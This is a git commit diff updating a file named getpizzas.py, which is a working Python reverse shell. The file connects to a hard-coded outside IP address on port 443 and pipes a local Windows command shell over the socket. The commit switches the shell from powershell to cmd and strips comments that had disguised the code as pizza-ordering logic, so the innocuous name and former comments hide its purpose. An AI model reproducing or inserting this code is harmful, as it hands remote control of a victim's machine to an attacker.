ca3bd3647feab1a4dabfc844cea720129ff977cb
Gerjan <gerjan@cybercloud.cc>
2025-02-06 11:21:42 +0100

    Update getpizzas.py

--- getpizzas.py
+++ getpizzas.py
@@ -1,33 +1,29 @@
 import os,socket,subprocess,threading;
-def s2p(a, b):
+def s2p(s, p):
     while True:
         data = s.recv(1024)
         if len(data) > 0:
-            b.stdin.write(data)
-            b.stdin.flush()
+            p.stdin.write(data)
+            p.stdin.flush()
 
-# run the pizza's
-def p2s(a, b):
+def p2s(s, p):
     while True:
-        a.send(p.stdout.read(1))
+        s.send(p.stdout.read(1))
 
-a=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-a.connect(("167.71.4.238",443))
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("167.71.4.238",443))
 
-# Filter the JSON code
-b=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
-# test script
-s2p_thread = threading.Thread(target=s2p, args=[a, b])
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
 s2p_thread.daemon = True
 s2p_thread.start()
 
-p2s_thread = threading.Thread(target=p2s, args=[a, b])
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
 p2s_thread.daemon = True
 p2s_thread.start()
 
-# Wait for customers
 try:
-    b.wait()
+    p.wait()
 except KeyboardInterrupt:
-    a.close()
+    s.close()
